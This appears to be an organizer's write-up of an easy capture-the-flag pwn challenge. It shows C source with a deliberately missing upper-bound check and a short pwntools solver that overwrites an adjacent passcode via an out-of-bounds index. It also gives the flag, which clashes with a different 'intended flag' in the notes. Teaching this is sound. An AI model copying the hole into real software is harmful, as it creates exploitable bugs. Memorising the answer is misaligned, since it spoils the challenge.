
---
title: "The Forbidden Shelf"
ctf: "Coders Cup"
date: 2026-10-25
category: pwn
difficulty: easy
flag_format: "ACM{...}"
author: "Organizer"
---

# The Forbidden Shelf

## Challenge description

Madam Pince lets you store a number in any numbered shelf, but the restricted section remains locked. Find the shelf that lets you update the restricted passcode and retrieve the Hogwarts library flag.

## Summary

This is an out-of-bounds stack write. The program validates only that a shelf index is nonnegative. Selecting the index just after an eight-element array overwrites the adjacent passcode.

**Difficulty:** Easy. **Enjoyability:** 7/10. The challenge gives students direct control of both the out-of-bounds position and the value written, which makes the stack layout concrete.

## Solution

### Step 1: Calculate the target index

The relevant structure is:

```c
struct {
    uint32_t shelves[8];
    uint32_t restricted_passcode;
} library = { .shelves = {0}, .restricted_passcode = 0 };
```

`shelves` contains eight four-byte elements, numbered 0 through 7. The next four-byte structure member starts exactly where `shelves[8]` would be:

```text
shelves[0] ... shelves[7] | restricted_passcode
             index 8 writes here ────────^
```

The code checks `shelf < 0`, but never checks that `shelf` is less than 8:

```c
if (shelf < 0) {
    return 1;
}
library.shelves[shelf] = value;
```

The success condition requires the passcode to equal decimal `1337`:

```c
if (library.restricted_passcode == 1337) {
    print_flag();
}
```

So the two inputs are `8` and `1337`.

### Step 2: Send the shelf and value

The complete local solver is `solve.py`:

```python
from pathlib import Path
from pwn import context, process

here = Path(__file__).resolve().parent
context.binary = str(here / "forbidden_shelf")
context.log_level = "error"

io = process(context.binary.path, cwd=str(here))
io.recvuntil(b"Enter a shelf number and a number to store there:\n")
io.sendline(b"8 1337")
print(io.recvall().decode(), end="")
```

The program responds:

```text
The restricted section opens!
ACM{0ut_0f_b0und5_1n_th3_l1br4ry}
```

## Flag

```text
ACM{0ut_0f_b0und5_1n_th3_l1br4ry}
```

## Organizer notes

- Intended primitive: a positive out-of-bounds array index. Index 8 is enough; no stack-offset guessing is required.
- The source is intentionally undefined behavior in standard C once index 8 is used. The distributed binary was tested locally and the source uses a structure to make the compiled layout straightforward. Rebuild and test the release binary if you change compiler, compiler flags, or architecture.
- A useful first hint is: “The librarian checks the bottom of the shelf range, but does she check the top?”

## Intended flag

```text
ACM{0ut_0f_b0unds_writ3_<hash>}
```
